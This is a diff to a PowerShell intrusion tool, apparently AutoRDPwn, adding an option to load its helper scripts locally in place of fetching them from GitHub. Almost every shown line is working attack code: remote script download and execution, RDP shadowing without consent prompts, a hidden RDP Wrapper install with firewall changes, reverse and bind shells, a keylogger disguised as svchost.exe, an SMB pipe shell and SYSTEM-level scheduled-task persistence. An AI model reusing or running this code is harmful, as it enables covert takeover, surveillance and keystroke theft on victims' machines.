@@ -571,7 +571,8 @@ function Remove-Exclusions {
     Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
     Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe "NamedPipeStream" } 2>&1> $null }}
 
-    if($vncserver){ $base64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')
+    if($vncserver){ $base64 = if ($local){ Get-Content .\Resources\Scripts\Invoke-VNCServer.ps1 } else {
+    (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')}
     invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
     $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
     Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
@@ -587,14 +588,14 @@ function Remove-Exclusions {
         do { Write-Host ; Write-Host "[?] $txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine() ; if(!$shadow){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
         elseif($shadow -notmatch '^[1-99]+$') { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $shadow = $null }} until ($shadow)}
 
-        if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user } else { xfreerdp /v:$computer /admin /u:$user /p:$password }}
-        if(!$nogui){ if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
+        if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
+        if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
         if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }} else {
         if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
         else { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$vncserver){ 
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RDPwrap.ps1')
+        if($local){ Import-Module .\Resources\Scripts\Invoke-RDPwrap.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RDPwrap.ps1')}
         invoke-command -session $RDP[0] -scriptblock { Set-Content -Path Setup.msi -Value $using:RDPWrap -Encoding Byte 
         msiexec /i "Setup.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null ; del .\Setup.msi
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
@@ -602,8 +603,8 @@ function Remove-Exclusions {
         attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; Start-Sleep -milliseconds 7500 ; rm .\Setup.msi 2>&1> $null }}
 
         if(!$sticky) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId | Sort-Object | Select-Object -Last 1 } ; Write-Host ; Write-Host "[+] $txt35" -ForegroundColor Blue ; Start-Sleep -milliseconds 2000 }
-        if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user } else { xfreerdp /v:$computer /admin /u:$user /p:$password }}
-        if(!$nogui){ if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
+        if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
+        if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
         if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }} else {
         if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
@@ -619,7 +620,7 @@ echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
-if ($webserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Start-WebServer.ps1')
+if ($webserver){ if($local){ Import-Module .\Resources\Scripts\Start-WebServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Start-WebServer.ps1')}
 invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
@@ -634,7 +635,7 @@ $metashell = $client = New-Object System.Net.Sockets.TCPClient("$metahost",$meta
 ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 invoke-command -session $RDP[0] -scriptblock { Invoke-Expression $using:metashell ; Start-Sleep -milliseconds 2000 }}
 
-if ($netcat -in 'local'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')
+if ($netcat -in 'local'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
 invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1
 Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
@@ -643,14 +644,14 @@ Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
 Invoke-PowerShellTcp -Bind -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
  
-if ($netcat -in 'remote'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')
+if ($netcat -in 'remote'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
 invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1 ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500
 Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
 
-if ($getkeys){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Keylogger.ps1')
+if ($getkeys){ if($local){ Import-Module .\Resources\Scripts\Invoke-Keylogger.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Keylogger.ps1')}
 invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path $env:temp\svchost.exe -Value $using:Content2 -Encoding Byte
 (Get-Process | ? {$_.Path -like "*Local\Temp\svchost.exe"}).kill() ; Remove-Item $env:LOCALAPPDATA\config.dat ; cd $env:temp ; .\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
@@ -658,7 +659,7 @@ Write-Host "              Remote Keylogger " -NoNewLine -ForegroundColor Green ;
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
 try { while($true) { Get-Content -wait $env:localappdata\config.dat }} finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}}
 
-if ($smbshell){ Write-Host; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
+if ($smbshell){ Write-Host ; if($local){ Import-Module .\Resources\Scripts\Invoke-PipeShell.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')}
 Invoke-PipeShell -mode client -server $computer -aeskey AutoRDPwn_AESKey -i -pipe "NamedPipeStream" -timeout 120 }
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
